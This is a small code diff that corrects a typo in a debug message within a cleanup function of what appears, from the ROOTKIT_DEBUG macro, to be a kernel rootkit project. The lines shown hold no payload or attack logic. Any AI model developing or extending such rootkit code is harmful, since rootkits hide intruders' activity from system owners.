@@ -498,7 +498,7 @@ initialize_control(void)
 void
 cleanup_control(void)
 {
-	ROOTKIT_DEBUG("Cleaning up control datastructues...\n");
+	ROOTKIT_DEBUG("Cleaning up control datastructures...\n");
 
 	struct list_head *cursor, *next;
 	struct file_name *name;
